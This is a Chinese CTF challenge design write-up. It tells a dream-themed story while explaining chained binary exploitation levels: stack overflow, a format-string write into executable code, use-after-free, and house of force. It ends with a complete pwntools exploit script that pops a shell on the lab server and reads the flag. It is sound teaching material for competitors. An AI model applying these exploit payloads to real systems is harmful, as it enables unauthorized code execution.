本题由春秋GAME伽玛实验室设计，赛后将该题的设计思路公开，供大家学习交流。

![image](https://image.3001.net/images/20220122/1642840186_61ebc07a1a8b06c039106.png!small)

## 00 楔子

你孤身一人，周围的环境陌生又熟悉，你只有获得每一层关卡的规则，才能醒来。

通过nc连接获得一个shell。  
![image](https://image.3001.net/images/20220122/1642840196_61ebc084146b66590483b.png!small)

本题考点如下：

    
    
    1. city：linux命令使用
    2. hotel：栈溢出，ret2text
    3. snow：格式化字符串，任意地址写，.text 段RWX
    4. home：UAF
    5. world：House of force
    6. final：隐藏文件分析
    

## 01 进入梦境

你孤身一人，周围的环境陌生又熟悉，你只有获得每一层关卡的规则，才能醒来；题目通过nc连接获得一个shell。

![image](https://image.3001.net/images/20220122/1642840227_61ebc0a35e82055b230da.png!small)

## 02 梦的开始

第一层梦境，你看到所有建筑都在眼前，但你却无法靠近，这时你使用"pwntools+cat命令"获得了梦中的地图。

![image](https://image.3001.net/images/20220122/1642840235_61ebc0ab76c9f05669558.png!small)

## 03 city

你来到城市中，想找人寻求帮助，想知道究竟发生了什么，但偌大的城市，街道空无一人，你"无可奈何"，却意外获得名为next的通行证，通过它你可以进入hotel建筑中进行探索（当前用户是city用户，无法进入hotel目录）。

![image](https://image.3001.net/images/20220122/1642840243_61ebc0b36d5fcbea88498.png!small)

## 04 hotel

旅馆中有一个名为"栈"的前台，“我能帮到你么？”他用着机械的口语向你问候，并带着僵硬的微笑。但你并不在意，你迫切的想知道现在到底在什么地方，究竟发生了什么。但你的无数的问题，换来的仍是冷冰冰的“我能帮到你么？”；你和"栈"不停的交谈，尽管获得的回答毫无意义，当你"垂头丧气"之时，"栈"突然崩溃冒烟，他竟然是一个机器人。

"栈溢出"，你这时掌握了第一个技能，通过"栈溢出"来执行旅馆的后门函数，获取该旅馆的权限，你拿到了旅馆的通行证。

>
> ret2text：栈中保存了函数调用时的返回地址。溢出的目的就是要将栈中保存的返回地址篡改成溢出的数据，这样就间接修改了函数的返回地址，当函数返回时，就能跳转到预设的地址中，执行植入的代码。hotel程序本身存在可以利用的片段system("/bin/bash"),可以直接将返回地址覆盖为system("/bin/bash")的地址
> 。

![image](https://image.3001.net/images/20220122/1642840275_61ebc0d3b40d5e72afdf1.png!small)

![image](https://image.3001.net/images/20220122/1642840282_61ebc0dae8f621bd5ddee.png!small)

    
    
    hotel_backdoor = 0x4006B6
    sla('you?\n',b'a'*0x38+p64(hotel_backdoor))
    sla('you!','./next')
    

## 05 snow

在你拿到通行证的那一刻，旅馆中突然下起大雪，待你回过神来，你直接来到冰天雪地之中。  
茫茫天地孤身一人，雪虐风饕，寒冷和孤独在摧残着你，你在这雪中漫无目的地行走，渴望找到一点帮助，一丝温暖；终于你忍不住倒下了，你想“就这么算了”。

这时你突然看到前方雪地中出现一个石碑，上面刻着“%”符号。“格式化字符串”，你获得第二项能力，在石碑上刻上特定的字符便可以走出这片雪地。

但暴风雪很大，你的身体已经僵硬，你只有一次格式化字符串的机会，能刻的字符数非常少。

>
> 格式化字符串漏洞：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是printf、sprintf，fprintf等C库中print家族的函数。printf函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。根据cdecl的调用约定，在进入printf()函数之前，程序将参数从右往左依次压栈，函数首先获取第一个参数，如果字符不是“%”，那么字符被复制到输出，否则，读取下一个非空字符，获取相应的参数并解析输出。

![image](https://image.3001.net/images/20220122/1642840293_61ebc0e54b161fea54bb2.png!small)

使用checksec、010edit、ida发现，存在一个rwx的段，经过分析，发现是text段存在rwx。

![image](https://image.3001.net/images/20220122/1642840300_61ebc0ec84e4a115cc520.png!small)

所以可以利用fmt的任意地址写，强制修改main函数的汇编代码，将 0x4008b0 处的 mov eax,0 更改为 jmp
0x4008b7，只需要改动2个字节`\x05\xeb`，也就是1515（十进制）。

![image](https://image.3001.net/images/20220122/1642840307_61ebc0f39e76e009a121d.png!small)

![image](https://image.3001.net/images/20220122/1642840315_61ebc0fb91c67d8a49858.png!small)

    
    
    sla('you?\n',b'%1515c%43$naaaa')
    sla('you!','./next')
    

## **06 home**

通过"栈"和"格式化字符串"结合，你终于走出雪地的一瞬间昏倒，睁眼时你在一个房间中醒来。柔软温暖的床垫让你忘掉刚才的寒冷，你起身开门来到走廊，发现了无数个房门伴随着无限的走廊向前延伸。你后头发现你刚刚走出的房间已经消失，伴随着的是一块完整的墙壁。你在这无限延伸的走廊中先前走着，重复着开门关门的动作，同样的房间内容，同样的房门关闭后变成墙壁，你感到麻木，不知道你走了多久，你感到"厌烦无奈"；这时你获得第三项技能"Use
After Free"。通过该技能，你知道房间生成是有规律的，"消失的房间又生成"成为了关键。

> UAF：Use After Free 就是当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况。
>
> 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
>
> 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。
>
> 内存块被释放后，其对应的指针没有被设置为
> NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。

![image](https://image.3001.net/images/20220122/1642840328_61ebc10825c75325984f5.png!small)

这里拿源码来讲解一下。

![image](https://image.3001.net/images/20220122/1642840342_61ebc1166d8076c422baa.png!small)

触发free之后，因为`descs[i]->room`就会为0（因为放到fastbin里面了），接着如果继续进入这个房间，会触发malloc函数，这样会重新申请出释放到fastbin中的chunk。导致了双指针引用，此时`name
== descs[i] == descs[i]->str`，可以往name里写入内容覆盖`descs[i]->print`函数指针。

## 07 gamma world

在无限的走廊里，你通过"Use After Free"技能，合理开关房门获得走廊的权限。  
获取权限的刹那，走廊四周悬空，你来到了里世界中"gamma
world"中，看到里世界的出口有着如钻石坚硬的墙壁。你明白只要自己生成"放弃，沮丧，烦躁"等负面情绪，便可以获得新的技能，直接走出里世界了，但当你准备放弃之时，你的潜意识却告诉你放弃将永远留在这里，你意识到前面的一次次放弃让你堕落在这深层的梦境中。你要凭借自己的能力走出这里。  
“你奋起一拳打在出口的墙壁上。”  
“你被传送到城市的入口处。”  
“你忘了发生的一切。”  
“.....”

最后进入world程序，是一个`house of force`，只有一开始有一个堆溢出刚好可以覆盖top_chunk，其他的部分都是正常无漏洞的代码。

> house of force：The Malloc Maleficarum，是一种通过攻击top
> chunk获取某块内存区域控制权的技术。可以利用程序漏洞（如堆溢出）把top
> chunk的size域修改成一个很大的数。以欺骗libc在请求一块很大的空间（略小于size）时能够使用top chunk来进行分配，top
> chunk的地址加上请求空间的大小，造成了整型溢出，使top
> chunk被转移到内存中的低地址区域（如.bss段、.data段、GOT表等），接下来再次请求空间，就可以获得转移地址后面的内存区域的控制权。
    
    
    1. 覆盖top chunk，修改为 -1
    2. 将大部分got表中的函数都执行一次，以便写入真实地址
    3. 使用 house of force ，将 top chunk 迁移到 got 区域
    4. 将free.got替换为text中的 puts-ret gadget，这样就可以leak地址了
    5. 覆盖bss中的create_lock，使得我们可以继续执行一次覆盖top_chunk的操作。
    6. 重新覆盖got中的free函数为system函数，最后触发system('/bin/sh')
    

## 08 life or death

无尽的循环，永恒的时间。  
每当你来到钻石墙壁前时才会想起一切，当你奋起一拳砸向墙壁时，便会被传送到城市入口忘记一切。

![image](https://image.3001.net/images/20220122/1642840384_61ebc14029781475fe65c.png!small)

敲碎墙壁，得到next通行证，获取到root权限后，发现有 life 、 death 文件夹，分别检查两个文件夹，发现life文件夹中有很多
flxxg的文件。

![image](https://image.3001.net/images/20220122/1642840392_61ebc14823116cb399e10.png!small)

death 则是一个软连接。

![image](https://image.3001.net/images/20220122/1642840399_61ebc14f00b935f17b29f.png!small)

因为ls经过简单的patch，去除了显示隐藏文件的功能，所以`ls -al`也不会显示隐藏的文件。可以使用cat测试隐藏文件，发现存在`...`目录。

> 在 Linux 里以点 (.) 开头的文件非常特别，被称为隐藏文件。 它们通常是隐藏的配置文件或系统文件。

![image](https://image.3001.net/images/20220122/1642840405_61ebc1558371a23bc6e58.png!small)

尝试使用cat命令来获取文件名与内容，获取flag。

![image](https://image.3001.net/images/20220122/1642840412_61ebc15c639ade8a33ca3.png!small)

## 09 突破

最后整理出的exp脚本：

    
    
    #!/usr/bin/python3
    from pwn import *
    
    sd=lambda x:p.send(x)
    sl=lambda x:p.sendline(x)
    sda=lambda x,y:p.sendafter(x,y)
    sla=lambda x,y:p.sendlineafter(x,y)
    ru=lambda x:p.recvuntil(x)
    rv=lambda x:p.recv(x)
    io=lambda :p.interactive()
    ps=lambda :pause()
    
    context.log_level = 'debug'
    i64_max = (1<<64)-1
    
    p = remote('192.168.99.133','10006')
    libc = ELF('./libc-2.23.so')
    # level 1
    sla('(y/n)','y')
    sl('./next')
    
    # level 2
    hotel_backdoor = 0x4006B6
    sla('you?\n',b'a'*0x38+p64(hotel_backdoor))
    sla('you!','./next')
    
    # level 3
    # \x05\xeb
    # jmp $5
    sla('you?\n',b'%1515c%43$naaaa')
    sla('you!','./next')
    
    # level 4
    sla('go?\n','bedroom')
    sla('go?\n','bedroom')
    sda('name: ',b'a\x00'*8 + p64(0x400896))
    sla('go?\n','a')
    sl('./next')
    
    # level 5
    def add(size, name, ac = True):
        if type(name) == str:
            name = name.encode()
        payload = 'create ' + str(size) + ' '
        payload = payload.encode() + name
        if ac:
            sla('accept',payload)
        else:
            sl(payload)
    
    def free(name, ac = True):
        if type(name) == str:
            name = name.encode()
        payload = b'destory ' + name
        if ac:
            sla('accept',payload)
        else:
            sl(payload)
    
    sla('?\n','create')
    
    ru('address is: ')
    heap_address = int(ru('\n'),16)
    print('heap_address: ', hex(heap_address))
    sda('name: ',b'a'*0xf8 + p64(i64_max))
    
    # padding
    add(0x18, 'aaa', False)
    add(0x18, 'bbb')
    add(0x18, 'ccc')
    add(0x18, 'ddd')
    add(0x18, 'eee')
    free('ccc')
    free('aaa')
    add(0x18, 'aaa')
    
    free_got = 0x602018
    
    # house of force
    add(str(free_got - heap_address - 0x100 - 0x80 - 0x18 - 0xc0), 'bbbb')
    
    free('ddd')
    free('aaa')
    magic_addr = 0x4010CF
    
    # overflow free
    add(0x88,b'a'*8+p64(magic_addr).replace(b'\x00',b'\t')[:-1])
    
    add(0x28,b'a'*0x10)
    
    # overflow world_core and overwrite objs
    sl('create')
    sla('name: ',p64(0) + p32(0) + p32(2) + p64(0x6020e0) + p64(0x602030) + b'\x00' * (0xf8-0x20) + p64(i64_max))
    
    free('world',False)
    ru('world.\n')
     
    puts_address = u64(rv(6)+b'\x00\x00')
    libc.address = puts_address - libc.sym['puts']
    print('libc->',hex(libc.address))
    
    sys = libc.sym['system']
    sh = next(libc.search(b'/bin/sh'))
    add(str(free_got - 0x6021c0 - 0x20),'cccc', False)
    
    ones = [0x45216,0x4526a,0xf02a4,0xf1147]
    one = libc.address + ones[3]
    
    add(0x88,b'a'*8+p64(sys).replace(b'\x00',b'\t')[:-1])
    add(0x18,b'/bin/sh\x00')
    free('world',False)
    
    sl('./next')
    ru('world!\n')
    sl('cat .../.really_flag')
    io()
    

## 10 结语

在开始设计题目时，就想着能否将“盗梦空间”不同梦境层次和“神秘博士拯救克拉拉的剧情结合在一起，所以采用了上述的构思方案。在最后的death目录时，最早想着要是能够使环境切换到最开始的city目录，并把flag放置在最开始的目录，将会是一种很好玩的策略，最后因为各种限制条件，还是放弃了这种方案。

另外在制作snow题目的时候，发现代码被gcc自动优化了（本来main函数中还有一个vuln函数，函数中包括格式化字符串漏洞），所有的代码流程全部被集成在了main函数里面，这样就无法通过一次的fmt劫持返回地址到后门函数。本着代码能够写出来就尽量不要改动的原则，就思考能不能有其他比较好玩的解决方法，然后就有了直接修改.text段的这种路线～

梦最终都是虚假的，正如梦中的生门，看起来里面有非常多的flag，如果觉得真正的flag就藏在里面，仔细寻找的话，就会迷失在梦境里面，永远无法回归现实。但如果选择死门，看似毫无头绪，但是你会从中发现梦境的瑕疵点，突破永恒的梦境。

![image](https://image.3001.net/images/20220122/1642840427_61ebc16b88b634790e873.png!small)

在春秋杯联赛社区，每场比赛的结束都并不意味着赛季的结束，后续我们还会有持续的学习以及丰富的活动。解题思路讲解、题目开源、免费练习平台，开放的社区讨论、技术经验分享沙龙聚会，CTF周边…

这里有竞赛，有交流，有活动，有联动。多种玩法，丰富的参与形式，如果你在秋季赛意犹未尽，如果你还没找到属于自己的舞台，赶紧加入春秋杯赛事宇宙吧！“公平、进步、纯粹”的春秋杯，永远值得期待！

未来我们将坚持春秋杯的初心“公平、进步、纯粹”，让“春秋杯”赛事宇宙的版图继续蔓延。始终坚定的定义网络安全赛事新标准，凝聚网络安全新社区，构建CTF新生态的使命。
**春秋杯赛事宇宙持续向你发出信号！**在这里无论你是热爱竞技的CTFer，还是各行业网络安全的从业者。无论你以哪种身份：选手、高校、企业、媒体，爱好者……参与，我们都真诚的欢迎你加入，成为春秋杯宇宙中独特有能量的星球。我们互相连接，凝聚更大的能量，共同打造一个无限想象、更加多元的赛事宇宙。

